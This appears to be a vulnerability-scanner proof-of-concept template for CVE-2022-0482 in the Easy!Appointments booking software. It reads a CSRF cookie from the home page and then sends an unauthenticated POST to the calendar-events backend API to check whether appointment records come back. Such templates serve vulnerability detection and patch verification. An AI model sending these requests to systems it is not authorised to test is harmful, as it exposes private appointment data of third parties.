name: poc-yaml-easyappointments-cve-2022-0482
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
            follow_redirects: false
        expression: response.status == 302 || response.status == 200
        output:
            search: |
                "csrfCookie=(?P<csrfCookie>[A-Za-z0-9]*)".submatch(response.headers["set-cookie"])
            csrfCookie: search["csrfCookie"]
    r1:
        request:
            cache: true
            method: POST
            path: /index.php/backend_api/ajax_get_calendar_events
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: csrfToken={{csrfCookie}}&startDate=2022-01-01&endDate=2022-05-01
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("json") && "\"appointments\":".bmatches(response.body)
expression: r0() && r1()
detail:
    author: 2husky
    links:
        - https://opencirt.com/hacking/securing-easy-appointments-cve-2022-0482/
    vulnerability:
        id: CT-396551
        level: critical
